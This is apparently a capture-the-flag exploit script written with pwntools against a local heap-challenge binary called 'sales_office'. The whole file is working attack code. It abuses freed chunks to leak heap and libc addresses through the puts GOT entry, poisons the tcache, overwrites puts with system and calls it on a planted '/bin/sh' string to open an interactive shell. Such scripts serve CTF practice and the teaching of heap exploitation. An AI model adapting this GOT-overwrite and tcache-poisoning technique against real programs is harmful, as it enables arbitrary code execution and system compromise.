#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./sales_office')
    elf = ELF('./sales_office')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

def cmd(c):
    p.recvuntil('choice:')
    p.sendline(str(c))

def buy(sz, content):
    cmd(1)
    p.recvuntil('house:\n')
    p.sendline(str(sz))
    p.recvuntil('house:\n')
    p.send(content)

def show(idx):
    cmd(3)
    p.recvuntil('index:\n')
    p.sendline(str(idx))

def sell(idx):
    cmd(4)
    p.recvuntil('index:\n')
    p.sendline(str(idx))

def exit():
    cmd(5)

puts_got = elf.got['puts']

buy(0x18, '0') # 0
buy(0x28, '1') # 1
buy(0x18, '2') # 2
sell(0)
sell(2)
show(2)
p.recvuntil('house:\n')
heap_base = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00')) - 0x260
info('heap_base = ' + hex(heap_base))
buy(0x18, '/bin/sh\x00') # 3
bin_sh_addr = heap_base + 0x310
sell(1)
buy(0x18, p64(puts_got) + p64(0x18)) # 4
show(0)
p.recvuntil('house:\n')
libc_base = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00')) - libc.symbols['puts']
info('libc_base = ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']

chunk2_addr = heap_base + 0x280
sell(4)
buy(0x18, p64(chunk2_addr)) # 5
sell(0)
buy(0x18, p64(puts_got))
buy(0x18, p64(system_addr))
cmd(3)
p.sendline('3')
#gdb.attach(p)

p.interactive()

